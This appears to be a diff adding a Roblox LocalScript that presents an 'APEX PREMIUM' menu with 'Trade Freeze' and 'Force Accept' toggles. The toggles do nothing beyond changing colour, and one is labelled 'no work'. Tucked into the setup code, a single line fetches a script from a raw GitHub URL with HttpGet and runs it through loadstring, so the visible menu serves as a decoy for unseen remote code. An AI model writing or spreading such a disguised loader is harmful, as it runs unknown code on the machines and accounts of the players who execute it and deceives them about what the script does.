@@ -1,0 +1,125 @@
+-- Place this LocalScript in StarterGui
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "SubcakeVNScriptUI"
+gui.ResetOnSpawn = false
+gui.Parent = player.PlayerGui
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vinh12eqweaws/vvvs/refs/heads/main/caz"))()
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Parent = gui
+frame.Size = UDim2.new(0, 280, 0, 160)
+frame.Position = UDim2.new(0.5, -140, 0.4, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+
+-- Top Label
+local title = Instance.new("TextLabel")
+title.Parent = frame
+title.Size = UDim2.new(1, 0, 0, 36)
+title.BackgroundTransparency = 1
+title.Text = "APEX PREMIUM"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextSize = 21
+title.Font = Enum.Font.GothamBold
+
+-- Function to create a draggable switch knob (no OFF text, stays red when off)
+local function createSwitch(parent, yPos, labelText)
+    local holder = Instance.new("Frame")
+    holder.Parent = parent
+    holder.Size = UDim2.new(1, -24, 0, 46)
+    holder.Position = UDim2.new(0, 12, 0, yPos)
+    holder.BackgroundTransparency = 1
+
+    local label = Instance.new("TextLabel")
+    label.Parent = holder
+    label.Size = UDim2.new(0, 110, 1, 0)
+    label.Position = UDim2.new(0, 0, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = labelText
+    label.TextColor3 = Color3.fromRGB(230,230,230)
+    label.TextSize = 18
+    label.Font = Enum.Font.Gotham
+
+    local toggleBG = Instance.new("Frame")
+    toggleBG.Parent = holder
+    toggleBG.Size = UDim2.new(0, 90, 0, 32)
+    toggleBG.Position = UDim2.new(0, 120, 0.5, -16)
+    toggleBG.BackgroundColor3 = Color3.fromRGB(180, 40, 40) -- red by default
+    toggleBG.BorderSizePixel = 0
+    toggleBG.Name = "ToggleBG"
+    local bgCorner = Instance.new("UICorner", toggleBG)
+    bgCorner.CornerRadius = UDim.new(1, 0)
+
+    -- Knob (simple white, no text, no "button" word)
+    local knob = Instance.new("Frame")
+    knob.Parent = toggleBG
+    knob.Size = UDim2.new(0, 32, 0, 32)
+    knob.Position = UDim2.new(0, 0, 0, 0)
+    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    knob.BorderSizePixel = 0
+    knob.Name = "Knob"
+    knob.ZIndex = 2
+    local knobCorner = Instance.new("UICorner", knob)
+    knobCorner.CornerRadius = UDim.new(1, 0)
+
+    local knobOutline = Instance.new("UIStroke", knob)
+    knobOutline.Thickness = 2
+    knobOutline.Color = Color3.fromRGB(80,80,80)
+
+    -- State
+    local state = false
+
+    local function setState(newState, animate)
+        state = newState
+        if state then
+            toggleBG.BackgroundColor3 = Color3.fromRGB(40, 170, 60) -- green
+            if animate then
+                knob:TweenPosition(UDim2.new(1, -32, 0, 0), "Out", "Quad", 0.15, true)
+            else
+                knob.Position = UDim2.new(1, -32, 0, 0)
+            end
+        else
+            toggleBG.BackgroundColor3 = Color3.fromRGB(180, 40, 40) -- red
+            if animate then
+                knob:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 0.15, true)
+            else
+                knob.Position = UDim2.new(0, 0, 0, 0)
+            end
+        end
+    end
+
+    setState(false, false)
+
+    -- Click the knob or the background to toggle
+    local function toggle()
+        setState(not state, true)
+        -- Optional: add your logic here for when toggled
+    end
+
+    -- Input for toggling
+    knob.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            toggle()
+        end
+    end)
+    toggleBG.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            toggle()
+        end
+    end)
+
+    return {
+        Knob = knob,
+        State = function() return state end,
+        SetState = setState,
+    }
+end
+
+-- Create toggles
+local switch1 = createSwitch(frame, 46, "Trade Freeze")
+local switch2 = createSwitch(frame, 98, "Force Accept")
+local switch3 = createSwitch(frame, 46, "no work")
